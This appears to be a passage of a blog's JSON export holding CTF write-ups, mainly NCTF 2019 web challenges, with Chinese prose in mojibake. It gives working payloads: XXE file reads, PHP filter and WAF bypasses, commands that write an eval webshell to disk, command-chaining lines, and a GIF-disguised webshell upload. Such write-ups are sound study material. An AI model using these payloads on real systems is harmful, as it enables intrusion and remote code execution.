target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/en/configuration.changes.php</a></p>\n<p><a href=\"https://www.cnblogs.com/xia0zhiwei/p/4713438.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/xia0zhiwei/p/4713438.html</a></p>\n<p><a href=\"http://www.vuln.cn/6001\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n</blockquote>\n","text":"ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š.htaccess &amp; .user.ini.user.iniä»¥ä¸‹éƒ¨åˆ†æ‘˜å–äºPç¥çš„åšå®¢http://www.vuln.cn/6001.user.ini æ˜¯ä»€ä¹ˆï¼Ÿåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨.user.iniæ„æˆæ–‡ä»¶åé—¨çš„æ–¹æ³•ã€‚","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"NCTF","slug":"NCTF","date":"2019-11-26T12:45:31.000Z","updated":"2020-04-29T05:45:19.118Z","comments":true,"path":"api/articles/NCTF.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"NCTF\"><a href=\"#NCTF\" class=\"headerlink\" title=\"NCTF\"></a>NCTF</h1><p>11/26/2019 8:45:31 PM </p>\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Fake-XML-cookbook\"><a href=\"#Fake-XML-cookbook\" class=\"headerlink\" title=\"Fake XML cookbook\"></a>Fake XML cookbook</h3><p>ç®€å•çš„xxe</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE creds [  \n&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; \n\n&lt;user&gt;&lt;username&gt;&amp;goodies;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</code></pre><h3 id=\"ture-XML-cookbook\"><a href=\"#ture-XML-cookbook\" class=\"headerlink\" title=\"ture XML cookbook\"></a>ture XML cookbook</h3><p>å¸¸ç”¨çš„å†…ç½‘IPæ–‡ä»¶<code>/etc/hosts</code> ã€ <code>/proc/net/arp</code> ã€ <code>/proc/net/fib_trie</code></p>\n<p><strong>requests</strong></p>\n<pre><code>&lt;!DOCTYPE ANY [\n\n&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/proc/net/fib_trie&quot;&gt;\n\n]&gt;\n\n\n&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;adssa&lt;/password&gt;&lt;/user&gt;</code></pre><p><strong>response</strong></p>\n<pre><code>X-Powered-By: PHP/7.4.0RC6\n\n\n&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;TWFpbjoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVApMb2NhbDoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAo=&lt;/msg&gt;&lt;/result&gt;</code></pre><p>è§£å¯†ï¼š</p>\n<pre><code>Main:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST\nLocal:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST</code></pre><p>ç…§ç€Ipè®¿é—®ï¼Œåæ§½æˆ‘çš„windowsä¸‹burpå“åº”å…¨æ˜¯ä¹±ç ï¼Œæäº†åŠå¤©å»kaliå°±æ²¡äº‹äº†ã€‚</p>\n<h3 id=\"ezphp\"><a href=\"#ezphp\" class=\"headerlink\" title=\"ezphp\"></a>ezphp</h3><pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__file__);\n$string_1 = $_GET[&apos;str1&apos;];\n$string_2 = $_GET[&apos;str2&apos;];\n$cmd = $_GET[&apos;q_w_q&apos;];\n\n\n//1st\nif($_GET[&apos;num&apos;] !== &apos;23333&apos; &amp;&amp; preg_match(&apos;/^23333$/&apos;, $_GET[&apos;num&apos;])){\n    echo &apos;1st ok&apos;.&quot;&lt;br&gt;&quot;;\n}\nelse{\n    die(&apos;23333333&apos;);\n}\n\n\n//2nd\nif(is_numeric($string_1)){\n    $md5_1 = md5($string_1);\n    $md5_2 = md5($string_2);\n    if($md5_1 != $md5_2){\n        $a = strtr($md5_1, &apos;cxhp&apos;, &apos;0123&apos;);    //strstr â€” æŸ¥æ‰¾å­—ç¬¦ä¸²çš„é¦–æ¬¡å‡ºç°ï¼Œ\n        $b = strtr($md5_2, &apos;cxhp&apos;, &apos;0123&apos;);\n        if($a == $b){\n            echo &apos;2nd ok&apos;.&quot;&lt;br&gt;&quot;;\n        }\n        else{\n            die(&quot;can u give me the right str???&quot;);\n        }\n    } \n    else{\n        die(&quot;no!!!!!!!!&quot;);\n    }\n}\nelse{\n    die(&apos;is str1 numeric??????&apos;);\n}\n\n\n//3rd\n$query = $_SERVER[&apos;QUERY_STRING&apos;];\nif (strlen($cmd) &gt; 8){\n    die(&quot;too long :(&quot;);\n}\n\nif( substr_count($query, &apos;_&apos;) === 0 &amp;&amp; substr_count($query, &apos;%5f&apos;) === 0 ){\n    $arr = explode(&apos; &apos;, $cmd);          //explode â€” ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²å¦ä¸€ä¸ªå­—ç¬¦ä¸²\n    if($arr[0] !== &apos;ls&apos; || $arr[0] !== &apos;pwd&apos;){\n        if(substr_count($cmd, &apos;cat&apos;) === 0){\n            system($cmd);\n        }\n        else{\n            die(&apos;ban cat :) &apos;);\n        }\n    }\n    else{\n        die(&apos;bad guy!&apos;);\n    }\n}\nelse{\n    die(&apos;nonono _ is bad&apos;);\n}\n?&gt; </code></pre><p>ç¬¬ä¸€å±‚ä½¿ç”¨ %0a æˆªæ–­ç»•è¿‡ï¼Œç¬¬äºŒå±‚md5ç»•è¿‡<a href=\"https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83\" target=\"_blank\" rel=\"noopener\">https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83</a> å‰é¢å‡ æ¡0eå¼€å¤´çš„å­—ç¬¦ä¸²å»è§£å¯†å‘ç°éƒ½æ”¶è´¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ <code>s878926199a</code> ,åŠ å¯†å®Œè§£å¯†å¾— <code>2120624</code> ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ•°å­—ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œç¬¬ä¸‰å±‚ ä½¿ç”¨ <code>.</code> ç»•è¿‡ <code>_</code> ï¼Œ<code>%20</code> æ›¿ä»£ç©ºæ ¼ï¼Œä½¿ç”¨<code>l${x}s</code> åˆ—ç›®å½•ï¼Œ<code>tac%20f*</code> è¯» <code>flag</code> .</p>\n<p>çœ‹ä¸€ä¸ª <code>strstr()</code> çš„ä¾‹å­</p>\n<pre><code>$email  = &apos;name@example.com&apos;;\n$domain = strstr($email, &apos;@&apos;);\necho $domain.&quot;\\r\\n&quot;; // æ‰“å° @example.com\n\n$user = strstr($email, &apos;@&apos;, true); // ä» PHP 5.3.0 èµ·\necho $user.&quot;\\r\\n&quot;; // æ‰“å° name\nvar_dump(&quot;01&quot;==true);\n\nè¾“å‡ºï¼š\n@example.com\nname\nbool(true)</code></pre><p>payload:</p>\n<pre><code>?num=23333%0a\n&amp;str1=2120624\n&amp;str2=s214587387a\n&amp;q.w.q=tac%20f*</code></pre><h3 id=\"hacker-backdoor\"><a href=\"#hacker-backdoor\" class=\"headerlink\" title=\"hacker backdoor\"></a>hacker backdoor</h3><pre><code> &lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;code&apos;]) || !isset($_GET[&apos;useful&apos;])){\n    highlight_file(__file__);\n}\n$code = $_GET[&apos;code&apos;];\n$usrful = $_GET[&apos;useful&apos;];\n\nfunction waf($a){\n    $dangerous = get_defined_functions();    //get_defined_functions â€” è¿”å›æ‰€æœ‰å·²å®šä¹‰å‡½æ•°çš„æ•°ç»„\n    array_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);  //å‹å…¥æ ˆåº•\n    foreach ($dangerous[&quot;internal&quot;] as $bad) {\n        if(strpos($a,$bad) !== FALSE){\n        return False;\n        break;\n        }\n    }\n    return True;\n}\n\nif(file_exists($usrful)){\n    if(waf($code)){\n        eval($code);\n    }\n    else{\n        die(&quot;oh,ä¸èƒ½è¾“å…¥è¿™äº›å‡½æ•°å“¦ :) &quot;);\n    }\n}</code></pre><p>æµ‹è¯•ä¸€ä¸‹$dangerous</p>\n<pre><code>&lt;?php  \n$dangerous = get_defined_functions();\narray_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);\nforeach ($dangerous[&quot;internal&quot;] as $bad) { \n    if(strpos(&quot;phpinfo&quot;,$bad)!== FALSE){\n        echo &quot;badbad&quot;.&quot;\\r\\n&quot;;\n    }\n}\n?&gt;</code></pre><p>ä½¿ç”¨å‘½ä»¤æ‹¼æ¥ç»•è¿‡ waf()</p>\n<pre><code>?code=?&gt;&lt;?php $a=&apos;php&apos;.&apos;info&apos;;$a();?&gt;\n&amp;useful=index.php</code></pre><p>disable_functiongs:</p>\n<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,delete</code></pre><p>ä»¤æ‰§è¡Œåˆ©ç”¨åŠç»•è¿‡å§¿åŠ¿ã€€ã€€</p>\n<p>å†™å…¥webshell:</p>\n<p>åˆ©ç”¨å‘½ä»¤æ³¨å…¥å†™ä¸€å¥è¯php webshellåˆ°webç›®å½•æ¶‰åŠåˆ°ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„è½¬ä¹‰ï¼Œå‡è®¾éœ€è¦å†™å…¥<?php eval($_POST[kang]); ?>ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š<br>WINDOWSï¼šç”¨^è½¬ä¹‰&lt;ï¼Œå³æ‰§è¡Œecho ^&lt;?php eval($_POST[kang]); ?^&gt; &gt; webå¯å†™ç›®å½•åŠ æ–‡ä»¶å®Œæ•´åå­—</p>\n<p>linuxä¸‹éœ€è¦ç”¨\\æ¥è½¬ä¹‰&lt;ï¼Œä¸è¿‡å¾ˆå¤šphpéƒ½é»˜è®¤å¼€å¯gpcï¼ˆé­”æœ¯å¼•å·magic_quotes_gpc()ï¼‰ã€‚å¯ä»¥å…ˆç”¨16è¿›åˆ¶è½¬æ¢ä¸€å¥è¯å†ç”¨xxdå‘½ä»¤æŠŠ16è¿›åˆ¶è¿˜åŸï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š<br>echo 3c3f706870206576616c28245f504f53545b6b616e675d293b203f3e|xxd -r -ps &gt; webå¯å†™ç›®å½•åŠ æ–‡ä»¶å®Œæ•´åå­—</p>\n<p>| å‘½ä»¤ç®¡é“ç¬¦</p>\n<p>&lt;&gt;&gt;&gt; æ–‡ä»¶é‡å®šå‘ç¬¦</p>\n<p>æµ‹è¯•ï¼š 0 | dir c:</p>\n<p>ã€€ã€€ä»£ç åªè¿‡æ»¤äº†éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦ï¼Œå¯ä»¥è€ƒè™‘ç”¨å…¶ä»–å­—ç¬¦è¿›è¡Œæµ‹è¯•ï¼Œè¿™è¾¹åˆ—ä¸¾ä¸€ä¸‹Window/Linuxå¯åˆ©ç”¨çš„ç‰¹æ®Šå­—ç¬¦ï¼š</p>\n<p>windowsæ”¯æŒï¼š</p>\n<p>|     ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥      ping 127.0.0.1|whoami          </p>\n<p>||    å‰é¢å‡ºé”™æ‰§è¡Œåé¢çš„ ï¼Œå‰é¢ä¸ºå‡       ping  2 || whoami </p>\n<p>&amp;   å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡                       ping 127.0.0.1&amp;whoami</p>\n<p>&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ    ping 127.0.0.1&amp;&amp;whoami</p>\n<p>Linuxæ”¯æŒ(æ¯”ä¸Šé¢å¤šä¸€ä¸ª):</p>\n<p>;     å‰é¢çš„æ‰§è¡Œå®Œæ‰§è¡Œåé¢çš„      ping 127.0.0.1;whoami  </p>\n<h3 id=\"upload-your-shell\"><a href=\"#upload-your-shell\" class=\"headerlink\" title=\"upload your shell\"></a>upload your shell</h3><p>æ‰“å¼€é¢˜ç›®åœ¨å¤´åƒé‚£é‡Œå¾— image æ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œå…ˆä¸Šä¼ </p>\n<pre><code>&lt;?php \n    @eval($_POST[shell]);\n     ?&gt;</code></pre><p>æç¤º <code>&lt;?</code> ï¼Œç„¶åç›´æ¥æ‹¿ä¸Šæ¬¡ SUCTF ç”¨å‰©ä¸‹å¾—é©¬</p>\n<pre><code>GIF89a\n&lt;script language=&apos;php&apos;&gt;\n    #system(&apos;cat /flag&apos;);\n    @eval($_POST[shell]);\n&lt;/script&gt;</code></pre><p>ç„¶åå†ä¿®æ”¹ content-type ï¼Œä¼ å®Œå¾—åˆ°å›¾ç‰‡è·¯å¾„ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œè§‚å¯Ÿåˆ°é“¾æ¥ä¸º </p>\n<pre><code>http://nctf2019.x1ct34m.com:60002/index.php?action=menu.html </code></pre><p>äºæ˜¯è®¿é—®</p>\n<pre><code>?action=upload-imgs/33498eb8814e110403efa2aebdff72d8/Th1s_is_a_fl4g.jpg</code></pre><p>å³å¯</p>\n<h3 id=\"replace\"><a href=\"#replace\" class=\"headerlink\" title=\"replace\"></a>replace</h3><p>æ–‡å­—æ›¿æ¢å·¥å…·ï¼Œhintï¼š<code>ä½¿ç”¨php5.6+bootstrapè¿›è¡Œå¼€å‘</code> ï¼ŒçŒœæµ‹ <code>preg_replace</code> çš„ <code>/e</code> ä»£ç æ‰§è¡Œã€‚</p>\n<p>ç¬¬ä¸‰ä¸ªæ¡†å†…çš„å†…å®¹åº”è¯¥å°±æ˜¯ /eçš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬è¾“å…¥ <code>var_dump(111)</code> ï¼ŒæˆåŠŸæ‰“å° <code>int(111)</code> ï¼Œè¾“å…¥å•å¼•å·åŒå¼•å·éƒ½ä¼šè¢«è¿‡æ»¤ï¼Œå¯ä»¥åˆ©ç”¨ chr() æ¥ç»•è¿‡ã€‚</p>\n<p>æˆ‘ä»¬è¾“å…¥scandir(chr(47)) å‘ç°åˆ—ä¸äº†ç›®å½•ã€‚ç›´æ¥è¯»æ–‡ä»¶ </p>\n<pre><code>file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103))//file_get_contents(&quot;/flag&quot;)</code></pre>","text":"NCTF11/26/2019 8:45:31 PM WEBFake XML cookbookç®€å•çš„xxe&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"}]},{"title":"SQLå…¥é—¨","slug":"SQLå…¥é—¨","date":"2019-08-02T01:43:50.000Z","updated":"2019-09-03T14:30:48.997Z","comments":true,"path":"api/articles/SQLå…¥é—¨.json","excerpt":"<p>Sqlæ³¨å…¥çœŸçš„è¶…ç¥å¥‡çš„ï¼Œæˆ‘æ€ä¹ˆéƒ½å­¦ä¸ä¼šå‘¢ï¼<br>ğŸ˜€</p>","keywords":null,"cover":null,"content":null,"text":"Sqlæ³¨å…¥çœŸçš„è¶…ç¥å¥‡çš„ï¼Œæˆ‘æ€ä¹ˆéƒ½å­¦ä¸ä¼šå‘¢ï¼<br>ğŸ˜€å¼€å§‹ä¹‹å‰å¸¸ç”¨å‡½æ•°ç³»ç»Ÿå‡½æ•°version() mysqlç‰ˆæœ¬user() æ•°æ®åº“ç”¨æˆ·ådatabase() æ•°æ®åº“å@@datadir æ•°æ®åº“è·¯å¾„@@version_compile_os æ“ä½œç³»ç»Ÿç‰ˆæœ¬å­—ç¬¦ä¸²è¿æ¥å‡½æ•°concat(","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"SQL","slug":"SQL","count":4,"path":"api/tags/SQL.json"}]},{"title":"RSA","slug":"RSA","date":"2018-05-23T07:13:47.000Z","updated":"2019-08-10T07:52:37.954Z","comments":true,"path":"api/articles/RSA.json","excerpt":"<p>æˆ‘æ‰äºŒåå‡ºå¤´ï¼Œä¸ºä»€ä¹ˆè¦æ‰¿å—è¿™ä¹ˆå¤šâ€¦</p>","keywords":null,"cover":null,"content":null,"text":"æˆ‘æ‰äºŒåå‡ºå¤´ï¼Œä¸ºä»€ä¹ˆè¦æ‰¿å—è¿™ä¹ˆå¤šâ€¦pubkey.pemæ–‡ä»¶æ„æˆJarvis OJ mediumRSAä¸ºä¾‹ä¸‹è½½æ–‡ä»¶æˆ‘ä»¬å¾—åˆ°äº†flag.encå’Œpubkey.pemï¼Œ<br>ä½¿ç”¨opensslæ¥è·å–å…¬é’¥ä¿¡æ¯root@kali-ctf:~/RSA/mediumRSA# openssl ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"RSA","slug":"RSA","count":4,"path":"api/tags/RSA.json"}]},{"title":"ZIP's things","slug":"ZIPä¼ªåŠ å¯†","date":"2019-03-23T07:13:47.000Z","updated":"2019-09-03T14:32:19.109Z","comments":true,"path":"api/articles/ZIPä¼ªåŠ å¯†.json","excerpt":"<p>åªè¦æˆ‘Eçš„å¤Ÿå¿«ï¼Œå¯‚å¯å°±è¿½ä¸ä¸Šæˆ‘ï¼</p>\n<p>å¯¹ä¸èµ·ï¼Œèµ°é”™ç‰‡åœºäº†~ğŸ˜„</p>","keywords":null,"cover":"http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kazyuumnj30gx0de41x.jpg","content":null,"text":"åªè¦æˆ‘Eçš„å¤Ÿå¿«ï¼Œå¯‚å¯å°±è¿½ä¸ä¸Šæˆ‘ï¼å¯¹ä¸èµ·ï¼Œèµ°é”™ç‰‡åœºäº†~ğŸ˜„##0x01 zipæ–‡ä»¶ç»„æˆ ##å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—1 å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºåœ¨è¿™ä¸ªæ•°æ®åŒºä¸­æ¯ä¸ªå‹ç¼©æ–‡ä»¶çš„æºæ–‡ä»¶/ç›®å½•éƒ½æ˜¯ä¸€æ¡è®°å½•ï¼Œè®°å½•æ ¼å¼å¦‚ä¸‹[æ–‡ä»¶å¤´+æ–‡ä»¶æ•°æ®+æ•°æ®æè¿°ç¬¦]æ–‡ä»¶å¤´ç»“æ„  ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"zip","slug":"zip","count":1,"path":"api/tags/zip.json"},{"name":"misc","slug":"misc","count":1,"path":"api/tags/misc.json"}]},{"title":"Session_unserlize","slug":"session-unserialize","date":"2019-08-01T11:33:07.000Z","updated":"2019-08-10T07:52:37.169Z","comments":true,"path":"api/articles/session-unserialize.json","excerpt":"<p>sessionçš„ååºåˆ—åŒ–åˆ©ç”¨</p>","keywords":null,"cover":"http://wx1.sinaimg.cn/mw690/006boCb9ly1g5jyd32htkj30iv04dt8q.jpg","content":null,"text":"sessionçš„ååºåˆ—åŒ–åˆ©ç”¨8/1/2019 10:44:57 AM å¯¹é­”æ³•å‡½æ•°çš„å†æ¬¡è®¤è¯†å¸¸ç”¨æ–¹æ³•__construct()//åˆ›å»ºå¯¹è±¡æ—¶è§¦å‘__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() /","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"},{"name":"serialize","slug":"serialize","count":4,"path":"api/tags/serialize.json"}]},{"title":"roarctf 2019","slug":"roarctf-2019","date":"2019-10-16T08:45:49.000Z","updated":"2019-11-06T13:13:29.498Z","comments":true,"path":"api/articles/roarctf-2019.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"roarctf-2019\"><a href=\"#roarctf-2019\" class=\"headerlink\" title=\"roarctf 2019\"></a>roarctf 2019</h1><p>10/16/2019 4:45:49 PM </p>\n<h2 id=\"easy-java\"><a href=\"#easy-java\" class=\"headerlink\" title=\"easy_java\"></a>easy_java</h2><p>æ‹¿åˆ°é¢˜ç›®çœ‹åˆ°æ–‡ä»¶ä¸‹è½½çš„æ¥å£ï¼Œå°è¯• <code>/Download?filename=help.docx</code> ,å‘ç°æ²¡æ³•ä¸‹è½½ï¼Œå°è¯•ä¸‹è½½ç½‘é¡µä¸Šçš„ç…§ç‰‡å‘ç°ä¹Ÿä¸‹è½½ä¸äº†ï¼Œåæ¥å°±è·‘åäº†ï¼Œåœ¨æƒ³ä¼šä¸ä¼šæ˜¯ <code>SSTI</code> ?fuzzäº†åŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°æ€è·¯.  ğŸ¨</p>\n<p>æ”¹å˜è¯·æ±‚æ–¹å¼ä¸º <code>post</code> å³å¯æˆåŠŸä¸‹è½½åˆ° <code>help.docx</code> ,é‡Œè¾¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚ </p>\n<p>éšä¾¿ä¸‹è½½ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œå¾—åˆ°æŠ¥é”™ä¿¡æ¯é‡Œæœ‰æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯ã€‚åšçš„æ—¶å€™å°±è¢«éš¾åˆ°çš„åœ°æ–¹å°±æ˜¯æ–‡ä»¶ä¸‹è½½ä¸çŸ¥é“ä¸‹è½½ä»€ä¹ˆä¸œè¥¿ã€‚è®°å¾—ä¸Šæ¬¡ç¢°åˆ°è¿™ç§é¢˜çš„æ—¶å€™è¿˜æ˜¯ <code>SUCTF</code> è¯» <code>nginx</code> é…ç½®æ–‡ä»¶</p>\n<h3 id=\"ä»€ä¹ˆæ˜¯-WEB-INF\"><a href=\"#ä»€ä¹ˆæ˜¯-WEB-INF\" class=\"headerlink\" title=\"ä»€ä¹ˆæ˜¯ WEB-INF\"></a>ä»€ä¹ˆæ˜¯ WEB-INF</h3><blockquote>\n<p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚æ‰€è°“å®‰å…¨å°±æ˜¯å®¢æˆ·ç«¯æ— æ³•è®¿é—®ï¼Œåªæœ‰æœåŠ¡ç«¯å¯ä»¥è®¿é—®çš„ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p>\n</blockquote>\n<ol>\n<li><p>/WEB-INF/web.xml</p>\n<p> Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</p>\n</li>\n<li><p>/WEB-INF/classes/</p>\n<p> åŒ…å«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ï¼ˆæ˜¯è¯¥ç›®å½•ä¸èƒ½åŒ…å«åœ¨.jaræ–‡ä»¶ä¸­ï¼‰ã€‚</p>\n</li>\n</ol>\n<p>å…¶ä»–çš„é…ç½®æ–‡ä»¶ä»‹ç»çœ‹<a href=\"https://baike.baidu.com/item/web-inf\" title=\"è¿™é‡Œ\" target=\"_blank\" rel=\"noopener\">https://baike.baidu.com/item/web-inf</a></p>\n<p>äº‹å®ä¸Šå°±æ˜¯åœ¨xmlä¸­é…ç½®å¥½æ˜ å°„è·¯å¾„ç„¶åè¿›è¡Œå¯¹æŸäº›å«å—ä¿æŠ¤å†…å®¹æ–‡ä»¶çš„è®¿é—®ã€‚</p>\n<p>æˆ‘ä»¬è®¿é—® <code>WEB-INF/web.xml</code> 